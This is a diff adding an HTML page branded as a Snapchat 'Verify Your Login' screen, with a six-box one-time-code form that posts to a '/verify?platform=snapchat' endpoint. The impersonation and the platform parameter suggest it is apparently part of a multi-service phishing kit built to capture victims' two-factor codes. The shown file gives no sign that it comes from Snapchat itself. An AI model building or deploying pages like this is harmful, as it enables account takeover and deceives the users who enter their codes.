@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Login • Snapchat</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        }
+        body {
+            background-color: #fffc00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background-color: white;
+            border-radius: 10px;
+            padding: 32px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 24px;
+            display: block;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 12px;
+            color: #000000;
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        .otp-form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .otp-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .otp-input {
+            width: 50px;
+            height: 50px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            background-color: #ffffff;
+            color: #000000;
+            transition: all 0.2s ease;
+        }
+        .otp-input:focus {
+            outline: none;
+            border-color: #00c4ff;
+        }
+        .verify-button {
+            height: 48px;
+            background-color: #000000;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        .verify-button:hover {
+            background-color: #333333;
+        }
+        .resend {
+            text-align: center;
+            margin-top: 24px;
+        }
+        .resend-button {
+            background: none;
+            border: none;
+            color: #00c4ff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .resend-button:hover {
+            color: #0099ff;
+        }
+        .timer {
+            color: #666;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+            <path fill="#fffc00" stroke="#000" stroke-width="20" d="M496.926,366.6c-3.373-9.176-19.883-30.187-64.262-42.39-8.985-2.464-18.617-4.545-28.78-6.246-.267-.043-2.595-.382-2.855-.425-7.866-1.142-15.957-1.8-24.047-2.153-8.835-.391-17.947-.443-27.02-.162-6.981.217-14.049.923-21.006,2.015-21.662,3.394-43.261,11.838-64.402,25.076-2.824,1.766-5.63,3.656-8.379,5.671-23.019,17.029-44.884,42.551-65.474,76.389-9.127,15.018-17.619,31.338-25.359,48.944-2.953,6.973-6.018,14.084-9.093,21.298-3.183,7.398-6.37,14.889-9.315,22.309-5.021,12.624-9.563,24.781-13.754,36.605-5.593,15.704-10.319,30.473-14.401,44.471-7.332,25.291-11.912,48.542-13.697,69.738-1,11.936-1.027,23.438-.015,34.26,2.304,24.766,11.965,45.447,27.422,58.722,17.39,14.929,41.339,22.5,71.27,22.5,19.587,0,42.034-4.327,68.266-13.164,25.935-8.811,54.644-21.895,87.407-39.652,48.435-26.318,102.241-60.954,160.775-103.249,35.893-25.929,73.683-54.833,112.618-85.998,25.201-20.18,50.693-41.497,75.704-63.536,11.29-9.938,22.779-20.206,34.053-30.687,8.841-8.206,17.202-16.264,25.221-24.145,5.407-5.314,10.466-10.427,15.095-15.323,13.883-14.686,23.342-27.35,28.183-37.715,2.797-5.981,4.283-11.464,4.462-16.352C512.44,385.542,507.527,375.23,496.926,366.6Z"/>
+        </svg>
+        <h1>Verify Your Login</h1>
+        <p class="subtitle">We've sent a verification code to your email/phone. Enter the code below to continue.</p>
+        <form class="otp-form" method="POST" action="/verify?platform=snapchat">
+            <div class="otp-inputs">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+            </div>
+            <input type="hidden" name="otp" id="full-otp">
+            <button type="submit" class="verify-button">Verify</button>
+        </form>
+        <div class="resend">
+            <button class="resend-button">Resend Code</button>
+            <div class="timer">Resend code in <span id="countdown">60</span>s</div>
+        </div>
+    </div>
+    <script>
+        // Auto-focus and auto-tab functionality for OTP inputs
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const form = document.querySelector('.otp-form');
+        const fullOtpInput = document.getElementById('full-otp');
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1) {
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Combine OTP inputs into hidden field before submit
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+            fullOtpInput.value = otp;
+            form.submit();
+        });
+
+        // Countdown timer
+        let timeLeft = 60;
+        const countdownElement = document.getElementById('countdown');
+        const timer = setInterval(() => {
+            timeLeft--;
+            countdownElement.textContent = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                document.querySelector('.resend-button').style.opacity = '1';
+                document.querySelector('.timer').style.display = 'none';
+            }
+        }, 1000);
+    </script>
+</body>
+</html> 
